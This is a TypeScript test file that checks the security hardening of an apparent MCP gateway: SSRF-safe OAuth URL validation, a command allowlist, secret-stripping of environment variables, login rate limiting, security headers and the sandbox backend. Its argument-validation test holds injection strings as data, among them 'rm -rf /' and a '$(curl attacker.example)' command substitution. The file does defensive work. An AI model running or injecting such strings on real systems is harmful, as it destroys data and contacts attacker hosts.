import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { lookup } from 'node:dns/promises'
import { buildServer } from '../../src/gateway/server.js'
import { adminRoutes } from '../../src/gateway/routes/admin.js'
import { healthRoutes } from '../../src/gateway/routes/health.js'
import { executeInSandbox } from '../../src/runtime/sandbox.js'
import { isAllowedOAuthUrl } from '../../src/security/url-validation.js'
import {
  hasDangerousArgs,
  isAllowedCommand,
  sanitizeEnv,
} from '../../src/security/command-validation.js'

vi.mock('node:dns/promises', () => ({
  lookup: vi.fn(),
}))

const lookupMock = vi.mocked(lookup)

describe('Security hardening integration', () => {
  const originalNodeEnv = process.env['NODE_ENV']
  const originalAdminToken = process.env['ADMIN_TOKEN']
  const originalGatewayAdminPassword = process.env['GATEWAY_ADMIN_PASSWORD']

  beforeEach(() => {
    vi.clearAllMocks()
  })

  afterEach(() => {
    if (originalNodeEnv === undefined) delete process.env['NODE_ENV']
    else process.env['NODE_ENV'] = originalNodeEnv

    if (originalAdminToken === undefined) delete process.env['ADMIN_TOKEN']
    else process.env['ADMIN_TOKEN'] = originalAdminToken

    if (originalGatewayAdminPassword === undefined) delete process.env['GATEWAY_ADMIN_PASSWORD']
    else process.env['GATEWAY_ADMIN_PASSWORD'] = originalGatewayAdminPassword
  })

  it('rejects OAuth URLs that resolve to private IPs', async () => {
    lookupMock.mockResolvedValue([{ address: '10.0.0.7', family: 4 }])

    const allowed = await isAllowedOAuthUrl('https://accounts.example.com/oauth2/authorize', [])

    expect(allowed).toBe(false)
    expect(lookupMock).toHaveBeenCalledWith('accounts.example.com', { all: true })
  })

  it('rejects non-HTTPS OAuth URLs', async () => {
    const allowed = await isAllowedOAuthUrl('http://accounts.example.com/oauth2/authorize', [])

    expect(allowed).toBe(false)
    expect(lookupMock).not.toHaveBeenCalled()
  })

  it('enforces command allowlist', () => {
    expect(isAllowedCommand('/usr/bin/node', ['/usr/bin/node', 'npm'])).toBe(true)
    expect(isAllowedCommand('node', ['/usr/bin/node'])).toBe(true)
    expect(isAllowedCommand('bash', ['/usr/bin/node', 'npm'])).toBe(false)
  })

  it('rejects dangerous command arguments', () => {
    expect(hasDangerousArgs(['--query', 'status:open'])).toBe(false)
    expect(hasDangerousArgs(['--query', 'status:open; rm -rf /'])).toBe(true)
    expect(hasDangerousArgs(['$(curl attacker.example)'])).toBe(true)
  })

  it('strips sensitive environment variables before process execution', () => {
    const sanitized = sanitizeEnv({
      PATH: '/usr/bin',
      HOME: '/home/test',
      ADMIN_TOKEN: 'super-secret',
      DOWNSTREAM_AUTH_ENCRYPTION_KEY: 'enc-key',
      MY_API_KEY: 'api-key',
      USER_PASSWORD: 'password',
      MCP_SESSION: 'ok',
      GATEWAY_MODE: 'test',
    })

    expect(sanitized).toEqual({
      PATH: '/usr/bin',
      HOME: '/home/test',
      MCP_SESSION: 'ok',
      GATEWAY_MODE: 'test',
    })
    expect(sanitized['ADMIN_TOKEN']).toBeUndefined()
    expect(sanitized['DOWNSTREAM_AUTH_ENCRYPTION_KEY']).toBeUndefined()
    expect(sanitized['MY_API_KEY']).toBeUndefined()
    expect(sanitized['USER_PASSWORD']).toBeUndefined()
  })

  it('applies rate limiting to admin login', async () => {
    process.env['ADMIN_TOKEN'] = '1'
    process.env['GATEWAY_ADMIN_PASSWORD'] = 'real-admin-password'

    const app = buildServer({ logLevel: 'silent' })
    await app.register(adminRoutes, {})
    await app.ready()

    const badLogin = {
      username: 'mcpgateway',
      password: 'wrong-password',
    }

    try {
      for (let attempt = 0; attempt < 10; attempt += 1) {
        const response = await app.inject({
          method: 'POST',
          url: '/admin/auth/login',
          payload: badLogin,
        })
        expect(response.statusCode).toBe(401)
      }

      const limited = await app.inject({
        method: 'POST',
        url: '/admin/auth/login',
        payload: badLogin,
      })

      expect(limited.statusCode).toBe(429)
      expect(limited.json()).toEqual(
        expect.objectContaining({
          error: 'RATE_LIMIT_EXCEEDED',
        })
      )
      expect(limited.headers['retry-after']).toBeDefined()
    } finally {
      await app.close()
    }
  })

  it('returns hardened security headers', async () => {
    const app = buildServer({ logLevel: 'silent' })
    await app.register(healthRoutes)
    await app.ready()

    try {
      const response = await app.inject({ method: 'GET', url: '/health' })

      expect(response.statusCode).toBe(200)
      expect(response.headers['x-frame-options']).toBe('DENY')
      expect(response.headers['x-content-type-options']).toBe('nosniff')
      expect(String(response.headers['strict-transport-security'])).toContain('max-age=31536000')
      expect(response.headers['content-security-policy']).toBeDefined()
    } finally {
      await app.close()
    }
  })

  it('sanitizes error responses in production mode', async () => {
    process.env['NODE_ENV'] = 'production'
    const app = buildServer({ logLevel: 'silent' })

    app.get('/boom', async () => {
      throw new Error('sensitive internal stack details')
    })

    await app.ready()

    try {
      const response = await app.inject({ method: 'GET', url: '/boom' })
      const body = response.json() as Record<string, unknown>

      expect(response.statusCode).toBe(500)
      expect(body['error']).toBe('INTERNAL_GATEWAY_ERROR')
      expect(body['message']).toBe('An unexpected error occurred')
      expect(body['details']).toBeUndefined()
    } finally {
      await app.close()
    }
  })

  it('requires isolated-vm as sandbox backend', async () => {
    await expect(
      executeInSandbox(
        {
          code: '1 + 1',
          memoryLimitMb: 64,
          executionTimeoutMs: 1_000,
          backend: 'vm' as never,
        },
        {
          catalogSearch: () => [],
          catalogList: () => [],
          catalogDescribe: () => ({}),
          mcpCall: () => ({}),
          mcpBatch: () => [],
          resultPick: (value) => value,
          resultLimit: (value) => value,
          resultCount: (value) => value,
          resultGroupBy: (value) => value,
          resultGrep: (value) => value,
          resultFlatten: (value) => value,
          resultSummarize: (value) => value,
          artifactsSave: () => ({ artifactRef: 'artifact_1' }),
          artifactsList: () => [],
        }
      )
    ).rejects.toThrow('Only "isolated-vm" is allowed')
  })
})
